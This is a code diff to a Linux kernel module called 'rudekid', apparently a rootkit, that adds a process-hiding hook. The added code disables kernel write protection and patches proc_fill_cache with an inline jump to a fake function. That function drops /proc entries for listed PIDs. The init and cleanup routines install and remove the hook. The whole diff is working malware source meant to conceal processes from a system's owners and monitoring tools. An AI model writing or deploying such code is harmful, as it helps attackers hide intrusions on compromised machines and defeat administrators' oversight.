@@ -109,9 +109,90 @@ void unhook_syslog(void)
     enable_ro();
 }
 
+atomic_t active_hook_calls = ATOMIC_INIT(0);
+
+bool fake__proc_fill_cache( struct file *file,
+                            struct dir_context *ctx,
+                            const char *name,
+                            int len,
+                            instantiate_t instantiate,
+                            struct task_struct *task,
+                            const void *ptr )
+{
+    unsigned i;
+    struct dentry *child, *dir = file->f_path.dentry;
+    struct qstr qname = QSTR_INIT(name, len);
+    struct inode *inode;
+    unsigned type;
+    ino_t ino;
+    bool ret;
+    char textbuf[16];
+
+    atomic_inc(&active_hook_calls);
+
+    for (i = 0; i < (sizeof(hidden_pids) / sizeof(hidden_pids[0])); ++i)
+    {
+        snprintf(textbuf, sizeof(textbuf), "%d", hidden_pids[i]);
+        if (strcmp(name, textbuf) == 0)
+        {
+            ret = true;
+            goto gtfo;
+        }
+    }
+
+    child = d_hash_and_lookup(dir, &qname);
+    if (!child) {
+        child = d_alloc(dir, &qname);
+        if (!child)
+            goto end_instantiate;
+        if (instantiate(d_inode(dir), child, task, ptr) < 0) {
+            dput(child);
+            goto end_instantiate;
+        }
+    }
+    inode = d_inode(child);
+    ino = inode->i_ino;
+    type = inode->i_mode >> 12;
+    dput(child);
+    ret = dir_emit(ctx, name, len, ino, type);
+    goto gtfo;
+
+end_instantiate:
+    ret = dir_emit(ctx, name, len, 1, DT_UNKNOWN);
+
+gtfo:
+    atomic_dec(&active_hook_calls);
+    return ret;
+}
+
+uint8_t func_backup[12];
+
+void hook_prochide(void)
+{
+    uint8_t* p;
+
+    disable_ro();
+    p = (uint8_t*)SM_proc_fill_cache;
+    memcpy(func_backup, p, sizeof(func_backup));
+    p[0] = 0x48;
+    p[1] = 0xb8;
+    *(void**)(p + 2) = fake__proc_fill_cache;
+    p[10] = 0xff;
+    p[11] = 0xe0;
+    enable_ro();
+}
+
+void unhook_prochide(void)
+{
+    disable_ro();
+    memcpy(SM_proc_fill_cache, func_backup, sizeof(func_backup));
+    enable_ro();
+}
+
 int init_module(void){
     printk(KERN_INFO "rudekid loaded.\n");
     hook_syslog();
+    hook_prochide();
 
     return 0;
 }
@@ -120,5 +201,6 @@ void cleanup_module(void){
     printk(KERN_INFO "rudekid unloaded.\n");
 
     unhook_syslog();
+    unhook_prochide();
 }
 
